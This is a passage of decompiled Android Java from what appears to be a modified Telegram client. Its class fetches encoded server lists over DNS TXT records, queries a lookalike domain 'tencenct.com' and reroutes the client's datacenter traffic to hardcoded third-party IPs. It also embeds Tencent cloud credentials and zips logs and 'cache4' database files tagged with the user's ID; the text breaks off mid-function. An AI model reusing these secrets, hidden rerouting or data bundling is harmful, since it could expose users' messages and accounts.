package cos;

import android.content.Context;
import android.os.Build;
import android.text.TextUtils;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.tencent.cos.xml.CosXmlServiceConfig;
import com.tencent.cos.xml.CosXmlSimpleService;
import com.tencent.qcloud.core.auth.ShortTimeCredentialProvider;
import j$.time.Duration;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.BuildVars;
import org.telegram.messenger.CharacterCompat;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.Utilities;
import org.telegram.tgnet.ConnectionsManager;
import org.telegram.tgnet.RequestDelegate;
import org.telegram.tgnet.TLObject;
import org.telegram.tgnet.TLRPC$JMT_getLineInfo;
import org.telegram.tgnet.TLRPC$JMT_getNewLineInfo;
import org.telegram.tgnet.TLRPC$TL_error;
import org.telegram.tgnet.TLRPC$TL_jsonString;
import org.telegram.ui.LaunchActivity;
import org.xbill.DNS.Lookup;
import org.xbill.DNS.Record;
import org.xbill.DNS.SimpleResolver;
import polib.Polib;

/* loaded from: classes.dex */
public class MyCOSService {
    private static volatile MyCOSService instance;
    private List<String> dnsPaths;
    private List<String> filePaths;
    private OkHttpClient mLogHttpClient;
    private OkHttpClient mOkHttpClient;
    private boolean isDownloading = false;
    private int currentDownloadIndex = 0;
    private long downloadDataTime = 0;
    private volatile boolean isInitDatacenter = false;

    static /* synthetic */ int access$208(MyCOSService myCOSService) {
        int i = myCOSService.currentDownloadIndex;
        myCOSService.currentDownloadIndex = i + 1;
        return i;
    }

    public static MyCOSService getInstance() {
        if (instance == null) {
            synchronized (MyCOSService.class) {
                if (instance == null) {
                    instance = new MyCOSService();
                }
            }
        }
        return instance;
    }

    public void init(Context context) {
        new CosXmlSimpleService(context, new CosXmlServiceConfig.Builder().setRegion("ap-hongkong").isHttps(true).builder(), new ShortTimeCredentialProvider("AKIDQ5d4JJDyXwDJEya5WEm7IG8yjTGKDuQj", "Ldpv3DINc8b4Mg19EF0rkWBg7d2GJMJ3", 300L));
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        this.mOkHttpClient = builder.connectTimeout(2L, timeUnit).writeTimeout(2L, timeUnit).readTimeout(2L, timeUnit).build();
        this.mLogHttpClient = new OkHttpClient.Builder().connectTimeout(5L, timeUnit).writeTimeout(10L, timeUnit).readTimeout(10L, timeUnit).build();
        this.filePaths = new ArrayList();
        ArrayList arrayList = new ArrayList();
        this.dnsPaths = arrayList;
        arrayList.add("208.67.222.123 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("208.67.220.123 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("8.8.4.4 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("199.85.127.10 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("208.67.220.220 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("208.67.222.222 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("218.30.118.6 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("64.6.65.6 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("1.1.1.1 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("199.85.126.10 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("168.95.192.1 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("168.95.1.1 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("4.2.2.1 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("209.244.0.3 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("94.140.14.14 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("216.146.36.36 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("1.0.0.1 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("209.244.0.4 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("185.228.169.168 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("80.80.80.80 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("77.88.8.8 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("77.88.8.88 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("77.88.8.2 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("195.46.39.39 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("198.54.117.10 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("94.140.15.15 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("216.146.35.35 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("9.9.9.9 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("64.6.64.6 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("185.228.168.168 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("149.112.112.112 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("4.2.2.2 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("80.80.81.81 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("8.8.8.8 - 53 - sx1a8aak9vupkff30ldi.com");
        this.dnsPaths.add("208.67.222.123 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("208.67.220.123 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("8.8.4.4 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("199.85.127.10 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("208.67.220.220 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("208.67.222.222 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("218.30.118.6 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("64.6.65.6 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("1.1.1.1 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("199.85.126.10 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("168.95.192.1 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("168.95.1.1 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("4.2.2.1 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("209.244.0.3 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("94.140.14.14 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("216.146.36.36 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("1.0.0.1 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("209.244.0.4 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("185.228.169.168 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("80.80.80.80 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("77.88.8.8 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("77.88.8.88 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("77.88.8.2 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("195.46.39.39 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("198.54.117.10 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("94.140.15.15 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("216.146.35.35 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("9.9.9.9 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("64.6.64.6 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("185.228.168.168 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("149.112.112.112 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("4.2.2.2 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("80.80.81.81 - 53 - g9rvactdgtjipxze6ldu.com");
        this.dnsPaths.add("8.8.8.8 - 53 - g9rvactdgtjipxze6ldu.com");
    }

    public void downloadFile(final int i) {
        if (this.isDownloading) {
            return;
        }
        this.isDownloading = true;
        try {
            final String str = this.filePaths.get(this.currentDownloadIndex);
            this.mOkHttpClient.newCall(new Request.Builder().url(str).build()).enqueue(new Callback() { // from class: cos.MyCOSService.2
                @Override // okhttp3.Callback
                public void onFailure(Call call, IOException iOException) {
                    if (BuildVars.LOGS_ENABLED) {
                        FileLog.e("downloadFile-error：" + str);
                    }
                    MyCOSService.access$208(MyCOSService.this);
                    if (MyCOSService.this.currentDownloadIndex >= MyCOSService.this.filePaths.size()) {
                        MyCOSService.this.currentDownloadIndex = 0;
                        MyCOSService.this.checkCountry(i, "");
                    } else {
                        MyCOSService.this.isDownloading = false;
                        MyCOSService.this.downloadFile(i);
                    }
                }

                @Override // okhttp3.Callback
                public void onResponse(Call call, Response response) throws IOException {
                    String string = response.body().string();
                    boolean checkHtml = MyCOSService.this.checkHtml(string);
                    if (BuildVars.LOGS_ENABLED) {
                        FileLog.e("downloadFile-success：" + str + " - " + string + " - " + checkHtml);
                    }
                    if (checkHtml) {
                        MyCOSService.this.isDownloading = false;
                        MyCOSService.this.downloadFile(i);
                    } else {
                        MyCOSService.this.checkCountry(i, string);
                    }
                }
            });
        } catch (Exception e) {
            if (BuildVars.LOGS_ENABLED) {
                FileLog.e("downloadFile-catch：" + e.getMessage());
            }
            checkCountry(i, "");
        }
    }

    public void downloadDNS(final int i) {
        if (this.isDownloading) {
            return;
        }
        this.isDownloading = true;
        new Thread(new Runnable() { // from class: cos.MyCOSService.3
            @Override // java.lang.Runnable
            public void run() {
                try {
                    String str = (String) MyCOSService.this.dnsPaths.get(MyCOSService.this.currentDownloadIndex);
                    String[] split = str.split(" - ");
                    String str2 = split[0];
                    int parseInt = Integer.parseInt(split[1]);
                    String str3 = split[2];
                    SimpleResolver simpleResolver = new SimpleResolver(str2);
                    simpleResolver.setPort(parseInt);
                    if (Build.VERSION.SDK_INT >= 26) {
                        simpleResolver.setTimeout(Duration.ofSeconds(2L));
                    } else {
                        simpleResolver.setTimeout(2);
                    }
                    Lookup lookup = new Lookup(str3, 16);
                    lookup.setResolver(simpleResolver);
                    lookup.run();
                    if (lookup.getResult() == 0) {
                        Record[] answers = lookup.getAnswers();
                        int length = answers.length;
                        String[] strArr = new String[length];
                        Pattern compile = Pattern.compile("@(\\d+)@(.*)");
                        for (Record record : answers) {
                            Matcher matcher = compile.matcher(record.rdataToString().replaceAll(" ", "").replaceAll("\n", "").replaceAll("\"", ""));
                            if (matcher.matches()) {
                                int parseInt2 = Integer.parseInt(matcher.group(1));
                                String group = matcher.group(2);
                                strArr[parseInt2 - 1] = group;
                                if (BuildVars.LOGS_ENABLED) {
                                    FileLog.e("downloadDNS-content：" + parseInt2 + " - " + group);
                                }
                            }
                        }
                        StringBuilder sb = new StringBuilder();
                        for (int i2 = 0; i2 < length; i2++) {
                            sb.append(strArr[i2]);
                        }
                        if (BuildVars.LOGS_ENABLED) {
                            FileLog.e("downloadDNS-success：" + str + " - " + ((Object) sb));
                        }
                        MyCOSService.this.checkCountry(i, sb.toString());
                        return;
                    }
                    if (BuildVars.LOGS_ENABLED) {
                        FileLog.e("downloadDNS-error：" + str);
                    }
                    MyCOSService.access$208(MyCOSService.this);
                    if (MyCOSService.this.currentDownloadIndex >= MyCOSService.this.dnsPaths.size()) {
                        MyCOSService.this.currentDownloadIndex = 0;
                        MyCOSService.this.checkCountry(i, "");
                    } else {
                        MyCOSService.this.isDownloading = false;
                        MyCOSService.this.downloadDNS(i);
                    }
                } catch (Exception e) {
                    if (BuildVars.LOGS_ENABLED) {
                        FileLog.e("downloadDNS-catch：" + e.getMessage());
                    }
                    MyCOSService.this.checkCountry(i, "");
                }
            }
        }).start();
    }

    public void downloadData(final int i) {
        TLObject tLRPC$JMT_getLineInfo;
        long currentTimeMillis = System.currentTimeMillis();
        if (currentTimeMillis - this.downloadDataTime < 2500) {
            return;
        }
        this.downloadDataTime = currentTimeMillis;
        if (BuildVars.sendNewProtocol) {
            tLRPC$JMT_getLineInfo = new TLRPC$JMT_getNewLineInfo();
        } else {
            tLRPC$JMT_getLineInfo = new TLRPC$JMT_getLineInfo();
        }
        ConnectionsManager.getInstance(i).sendRequest(tLRPC$JMT_getLineInfo, new RequestDelegate() { // from class: cos.MyCOSService.4
            @Override // org.telegram.tgnet.RequestDelegate
            public void run(TLObject tLObject, TLRPC$TL_error tLRPC$TL_error) {
                if (tLRPC$TL_error == null) {
                    try {
                        String str = ((TLRPC$TL_jsonString) tLObject).value;
                        boolean checkHtml = MyCOSService.this.checkHtml(str);
                        if (BuildVars.LOGS_ENABLED) {
                            FileLog.e("downloadData-success：" + str + " - " + checkHtml);
                        }
                        if (checkHtml) {
                            return;
                        }
                        MyCOSService.this.checkCountry(i, str);
                        return;
                    } catch (Exception e) {
                        if (BuildVars.LOGS_ENABLED) {
                            FileLog.e("downloadData-catch：" + e.getMessage());
                            return;
                        }
                        return;
                    }
                }
                if (BuildVars.LOGS_ENABLED) {
                    FileLog.e("downloadData-error：" + tLRPC$TL_error.text);
                }
            }
        }, 10);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean checkHtml(String str) {
        return Pattern.compile("<([^>]*)>").matcher(str).find();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void checkCountry(final int i, final String str) {
        this.mOkHttpClient.newCall(new Request.Builder().url("http://console.cloud.tencenct.com:9999").build()).enqueue(new Callback() { // from class: cos.MyCOSService.5
            @Override // okhttp3.Callback
            public void onFailure(Call call, IOException iOException) {
                if (!TextUtils.isEmpty(str)) {
                    MyCOSService.this.setCloudLine(i, true, str);
                } else {
                    MyCOSService.this.setDefaultLine(i, true);
                }
            }

            @Override // okhttp3.Callback
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    String string = response.body().string();
                    if (!TextUtils.isEmpty(string)) {
                        try {
                            boolean optBoolean = new JSONObject(string).optBoolean("isChina");
                            if (!TextUtils.isEmpty(str)) {
                                MyCOSService.this.setCloudLine(i, optBoolean, str);
                            } else {
                                MyCOSService.this.setDefaultLine(i, optBoolean);
                            }
                            return;
                        } catch (Exception unused) {
                            if (!TextUtils.isEmpty(str)) {
                                MyCOSService.this.setCloudLine(i, true, str);
                                return;
                            } else {
                                MyCOSService.this.setDefaultLine(i, true);
                                return;
                            }
                        }
                    }
                    if (!TextUtils.isEmpty(str)) {
                        MyCOSService.this.setCloudLine(i, true, str);
                        return;
                    } else {
                        MyCOSService.this.setDefaultLine(i, true);
                        return;
                    }
                }
                if (!TextUtils.isEmpty(str)) {
                    MyCOSService.this.setCloudLine(i, true, str);
                } else {
                    MyCOSService.this.setDefaultLine(i, true);
                }
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void setCloudLine(final int i, final boolean z, final String str) {
        new Timer().schedule(new TimerTask() { // from class: cos.MyCOSService.6
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                try {
                    JSONObject jSONObject = new JSONObject(ConnectionsManager.getInstance(i).decryptHex(str));
                    if (jSONObject.optInt("startCloud") == 1) {
                        int startCloud = LaunchActivity.startCloud();
                        if (startCloud != 0 && startCloud != 200) {
                            MyCOSService.this.setCloudLine(i, z, str);
                            return;
                        }
                        int optInt = jSONObject.optInt("cloudPort");
                        String[] strArr = {"127.0.0.1"};
                        int[] iArr = {optInt};
                        ConnectionsManager connectionsManager = ConnectionsManager.getInstance(i);
                        if (!MyCOSService.this.isInitDatacenter) {
                            MyCOSService.this.isInitDatacenter = true;
                            connectionsManager.initDatacenterAddresses(strArr, iArr);
                            return;
                        } else {
                            connectionsManager.applyDatacenterAddresses(1, strArr, iArr);
                            connectionsManager.resumeNetworkMaybe();
                            return;
                        }
                    }
                    if (z) {
                        JsonArray leapIp = MyCOSService.this.leapIp(MyCOSService.this.parseDatacenters(jSONObject.getJSONArray("gfw")));
                        int size = leapIp.size();
                        String[] strArr2 = new String[size];
                        int[] iArr2 = new int[size];
                        for (int i2 = 0; i2 < leapIp.size(); i2++) {
                            String[] split = leapIp.get(i2).getAsJsonObject().get("address").getAsString().split(":");
                            strArr2[i2] = split[0];
                            iArr2[i2] = Integer.parseInt(split[1]);
                        }
                        ConnectionsManager connectionsManager2 = ConnectionsManager.getInstance(i);
                        if (!MyCOSService.this.isInitDatacenter) {
                            MyCOSService.this.isInitDatacenter = true;
                            connectionsManager2.initDatacenterAddresses(strArr2, iArr2);
                        } else {
                            connectionsManager2.applyDatacenterAddresses(1, strArr2, iArr2);
                            connectionsManager2.resumeNetworkMaybe();
                        }
                    } else {
                        JsonArray leapIp2 = MyCOSService.this.leapIp(MyCOSService.this.parseDatacenters(jSONObject.getJSONArray("other")));
                        int size2 = leapIp2.size();
                        String[] strArr3 = new String[size2];
                        int[] iArr3 = new int[size2];
                        for (int i3 = 0; i3 < leapIp2.size(); i3++) {
                            String[] split2 = leapIp2.get(i3).getAsJsonObject().get("address").getAsString().split(":");
                            strArr3[i3] = split2[0];
                            iArr3[i3] = Integer.parseInt(split2[1]);
                        }
                        ConnectionsManager connectionsManager3 = ConnectionsManager.getInstance(i);
                        if (!MyCOSService.this.isInitDatacenter) {
                            MyCOSService.this.isInitDatacenter = true;
                            connectionsManager3.initDatacenterAddresses(strArr3, iArr3);
                        } else {
                            connectionsManager3.applyDatacenterAddresses(1, strArr3, iArr3);
                            connectionsManager3.resumeNetworkMaybe();
                        }
                    }
                    MyCOSService.this.isDownloading = false;
                } catch (Exception unused) {
                    MyCOSService.this.setDefaultLine(i, z);
                }
            }
        }, 2500L);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public List<JSONObject> parseDatacenters(JSONArray jSONArray) throws Exception {
        ArrayList arrayList = new ArrayList();
        for (int i = 0; i < jSONArray.length(); i++) {
            arrayList.add(jSONArray.getJSONObject(i));
        }
        return arrayList;
    }

    public void setDefaultLine(final int i, final boolean z) {
        new Timer().schedule(new TimerTask() { // from class: cos.MyCOSService.7
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                AnonymousClass7 anonymousClass7;
                try {
                    HashMap hashMap = new HashMap();
                    try {
                        if (z) {
                            hashMap.put("110.188.23.209", 30782);
                            hashMap.put("36.99.44.41", 30782);
                            hashMap.put("117.80.87.133", 30782);
                            hashMap.put("36.26.88.92", 30782);
                            hashMap.put("59.80.22.205", 30782);
                            hashMap.put("36.99.41.150", 30782);
                            hashMap.put("27.150.181.120", 30782);
                            hashMap.put("113.24.66.232", 30782);
                            hashMap.put("106.58.215.39", 30782);
                            hashMap.put("222.218.194.22", 30782);
                            hashMap.put("42.123.122.239", 30782);
                            hashMap.put("36.108.169.174", 30782);
                            hashMap.put("223.247.136.226", 30782);
                            hashMap.put("1.71.57.43", 30782);
                            hashMap.put("175.6.37.72", 30782);
                            hashMap.put("125.75.98.231", 30782);
                            hashMap.put("36.99.169.108", 30782);
                            hashMap.put("1.71.139.191", 30782);
                            hashMap.put("110.185.105.105", 30782);
                            hashMap.put("125.75.149.21", 30782);
                            hashMap.put("203.56.254.41", 30782);
                            hashMap.put("116.198.37.144", 30782);
                            hashMap.put("114.67.97.4", 30782);
                            hashMap.put("116.198.249.51", 30782);
                            hashMap.put("114.67.198.178", 30782);
                            hashMap.put("110.188.23.209", 30782);
                            hashMap.put("36.99.44.41", 30782);
                            hashMap.put("117.80.87.133", 30782);
                            hashMap.put("36.26.88.92", 30782);
                            hashMap.put("59.80.22.205", 30782);
                            hashMap.put("36.99.41.150", 30782);
                            hashMap.put("27.150.181.120", 30782);
                            hashMap.put("113.24.66.232", 30782);
                            hashMap.put("106.58.215.39", 30782);
                            hashMap.put("222.218.194.22", 30782);
                            hashMap.put("42.123.122.239", 30782);
                            hashMap.put("36.108.169.174", 30782);
                            hashMap.put("223.247.136.226", 30782);
                            hashMap.put("1.71.57.43", 30782);
                            hashMap.put("175.6.37.72", 30782);
                            hashMap.put("125.75.98.231", 30782);
                            hashMap.put("36.99.169.108", 30782);
                            hashMap.put("1.71.139.191", 30782);
                            hashMap.put("110.185.105.105", 30782);
                            hashMap.put("125.75.149.21", 30782);
                            hashMap.put("203.56.254.41", 30782);
                            hashMap.put("116.198.37.144", 30782);
                            hashMap.put("114.67.97.4", 30782);
                            hashMap.put("116.198.249.51", 30782);
                            hashMap.put("114.67.198.178", 30782);
                        } else {
                            hashMap.put("110.188.23.209", 30782);
                            hashMap.put("36.99.44.41", 30782);
                            hashMap.put("117.80.87.133", 30782);
                            hashMap.put("36.26.88.92", 30782);
                            hashMap.put("59.80.22.205", 30782);
                            hashMap.put("36.99.41.150", 30782);
                            hashMap.put("27.150.181.120", 30782);
                            hashMap.put("113.24.66.232", 30782);
                            hashMap.put("106.58.215.39", 30782);
                            hashMap.put("222.218.194.22", 30782);
                            hashMap.put("42.123.122.239", 30782);
                            hashMap.put("36.108.169.174", 30782);
                            hashMap.put("223.247.136.226", 30782);
                            hashMap.put("1.71.57.43", 30782);
                            hashMap.put("175.6.37.72", 30782);
                            hashMap.put("125.75.98.231", 30782);
                            hashMap.put("36.99.169.108", 30782);
                            hashMap.put("1.71.139.191", 30782);
                            hashMap.put("110.185.105.105", 30782);
                            hashMap.put("125.75.149.21", 30782);
                            hashMap.put("203.56.254.41", 30782);
                            hashMap.put("116.198.37.144", 30782);
                            hashMap.put("114.67.97.4", 30782);
                            hashMap.put("116.198.249.51", 30782);
                            hashMap.put("114.67.198.178", 30782);
                            hashMap.put("110.188.23.209", 30782);
                            hashMap.put("36.99.44.41", 30782);
                            hashMap.put("117.80.87.133", 30782);
                            hashMap.put("36.26.88.92", 30782);
                            hashMap.put("59.80.22.205", 30782);
                            hashMap.put("36.99.41.150", 30782);
                            hashMap.put("27.150.181.120", 30782);
                            hashMap.put("113.24.66.232", 30782);
                            hashMap.put("106.58.215.39", 30782);
                            hashMap.put("222.218.194.22", 30782);
                            hashMap.put("42.123.122.239", 30782);
                            hashMap.put("36.108.169.174", 30782);
                            hashMap.put("223.247.136.226", 30782);
                            hashMap.put("1.71.57.43", 30782);
                            hashMap.put("175.6.37.72", 30782);
                            hashMap.put("125.75.98.231", 30782);
                            hashMap.put("36.99.169.108", 30782);
                            hashMap.put("1.71.139.191", 30782);
                            hashMap.put("110.185.105.105", 30782);
                            hashMap.put("125.75.149.21", 30782);
                            hashMap.put("203.56.254.41", 30782);
                            hashMap.put("116.198.37.144", 30782);
                            hashMap.put("114.67.97.4", 30782);
                            hashMap.put("116.198.249.51", 30782);
                            hashMap.put("114.67.198.178", 30782);
                        }
                        ArrayList arrayList = new ArrayList();
                        for (Map.Entry entry : new ArrayList(hashMap.entrySet())) {
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put("ip", entry.getKey());
                            jSONObject.put("port", entry.getValue());
                            arrayList.add(jSONObject);
                        }
                        anonymousClass7 = this;
                        try {
                            JsonArray leapIp = MyCOSService.this.leapIp(arrayList);
                            int size = leapIp.size();
                            String[] strArr = new String[size];
                            int[] iArr = new int[size];
                            for (int i2 = 0; i2 < leapIp.size(); i2++) {
                                String[] split = leapIp.get(i2).getAsJsonObject().get("address").getAsString().split(":");
                                strArr[i2] = split[0];
                                iArr[i2] = Integer.parseInt(split[1]);
                            }
                            ConnectionsManager connectionsManager = ConnectionsManager.getInstance(i);
                            if (!MyCOSService.this.isInitDatacenter) {
                                MyCOSService.this.isInitDatacenter = true;
                                connectionsManager.initDatacenterAddresses(strArr, iArr);
                            } else {
                                connectionsManager.applyDatacenterAddresses(1, strArr, iArr);
                                connectionsManager.resumeNetworkMaybe();
                            }
                        } catch (Exception unused) {
                        }
                    } catch (Exception unused2) {
                        anonymousClass7 = this;
                    }
                } catch (Exception unused3) {
                    anonymousClass7 = this;
                }
                MyCOSService.this.isDownloading = false;
            }
        }, 2500L);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public JsonArray leapIp(List<JSONObject> list) {
        JsonObject jsonObject = new JsonObject();
        JsonArray jsonArray = new JsonArray();
        for (JSONObject jSONObject : list) {
            jsonArray.add(jSONObject.optString("ip") + ":" + jSONObject.optInt("port"));
        }
        jsonObject.add("addresses", jsonArray);
        jsonObject.addProperty("timeoutMills", (Number) 1000);
        jsonObject.addProperty("newProtocol", Boolean.valueOf(BuildVars.sendNewProtocol));
        if (BuildVars.LOGS_ENABLED) {
            FileLog.e("leapIp-排序前：" + jsonObject.toString());
        }
        String leadIp = Polib.leadIp(jsonObject.toString());
        if (BuildVars.LOGS_ENABLED) {
            FileLog.e("leapIp-排序后：" + leadIp);
        }
        JsonArray jsonArray2 = (JsonArray) new Gson().fromJson(leadIp, JsonArray.class);
        ArrayList arrayList = new ArrayList();
        ArrayList arrayList2 = new ArrayList();
        for (int i = 0; i < jsonArray2.size(); i++) {
            JsonObject asJsonObject = jsonArray2.get(i).getAsJsonObject();
            if (asJsonObject.get("mills").getAsLong() <= 500) {
                arrayList.add(asJsonObject);
            } else {
                arrayList2.add(asJsonObject);
            }
        }
        if (BuildVars.LOGS_ENABLED) {
            FileLog.e("leapIp-500毫秒-快：" + arrayList);
            FileLog.e("leapIp-500毫秒-慢：" + arrayList2);
        }
        Collections.shuffle(arrayList, new Random());
        arrayList2.addAll(0, arrayList);
        String obj = arrayList2.toString();
        if (BuildVars.LOGS_ENABLED) {
            FileLog.e("leapIp-500毫秒-排序后：" + obj);
        }
        return (JsonArray) new Gson().fromJson(obj, JsonArray.class);
    }

    public void connectProxy(int i) {
        int startCloud = LaunchActivity.startCloud();
        if (startCloud == 0 || startCloud == 200) {
            String[] strArr = {"127.0.0.1"};
            int[] iArr = {BuildVars.cloudPort};
            ConnectionsManager connectionsManager = ConnectionsManager.getInstance(i);
            if (!this.isInitDatacenter) {
                this.isInitDatacenter = true;
                connectionsManager.initDatacenterAddresses(strArr, iArr);
            } else {
                connectionsManager.applyDatacenterAddresses(1, strArr, iArr);
                connectionsManager.resumeNetworkMaybe();
            }
        }
    }

    public void submitLogs() {
        submitLogs(new Callback(this) { // from class: cos.MyCOSService.8
            @Override // okhttp3.Callback
            public void onFailure(Call call, IOException iOException) {
            }

            @Override // okhttp3.Callback
            public void onResponse(Call call, Response response) throws IOException {
            }
        });
    }

    public void submitLogs(final Callback callback) {
        Utilities.globalQueue.postRunnable(new Runnable() { // from class: cos.MyCOSService$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                MyCOSService.this.lambda$submitLogs$0(callback);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$submitLogs$0(Callback callback) {
        ZipOutputStream zipOutputStream;
        try {
            File logsDir = AndroidUtilities.getLogsDir();
            if (logsDir == null) {
                return;
            }
            File file = new File(logsDir, "청년(20250226)-" + UserConfig.getInstance(UserConfig.selectedAccount).getClientUserId() + ".zip");
            if (file.exists()) {
                file.delete();
            }
            ArrayList arrayList = new ArrayList();
            for (File file2 : logsDir.listFiles()) {
                arrayList.add(file2);
            }
            File file3 = new File(ApplicationLoader.getFilesDirFixed(), "malformed_database/");
            if (file3.exists() && file3.isDirectory()) {
                for (File file4 : file3.listFiles()) {
                    arrayList.add(file4);
                }
            }
            long currentTimeMillis = System.currentTimeMillis();
            BufferedInputStream bufferedInputStream = null;
            try {
                try {
                    try {
                        zipOutputStream = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(file)));
                        try {
                            byte[] bArr = new byte[CharacterCompat.MIN_SUPPLEMENTARY_CODE_POINT];
                            for (int i = 0; i < arrayList.size(); i++) {
                                File file5 = (File) arrayList.get(i);
                                if ((file5.getName().contains("cache4") || !file5.getName().contains("_mtproto") || currentTimeMillis - file5.lastModified() <= 86400000) && file5.exists()) {
                                    BufferedInputStream bufferedInputStream2 = new BufferedInputStream(new FileInputStream(file5), CharacterCompat.MIN_SUPPLEMENTARY_CODE_POINT);
                                    try {
                                        zipOutputStream.putNextEntry(new ZipEntry(file5.getName()));
                                        while (true) {
                                            int read = bufferedInputStream2.read(bArr, 0, CharacterCompat.MIN_SUPPLEMENTARY_CODE_POINT);
                                            if (read == -1) {
                                                break;
                                            } else {
                                                zipOutputStream.write(bArr, 0, read);
                                            }
                                        }
                                        bufferedInputStream2.close();
                                    } catch (Exception e) {
                                        e = e;
                                        bufferedInputStream = bufferedInputStream2;
                                        e.printStackTrace();
                                        if (bufferedInputStream != null) {
                                            bufferedInputStream.close();
                                        }
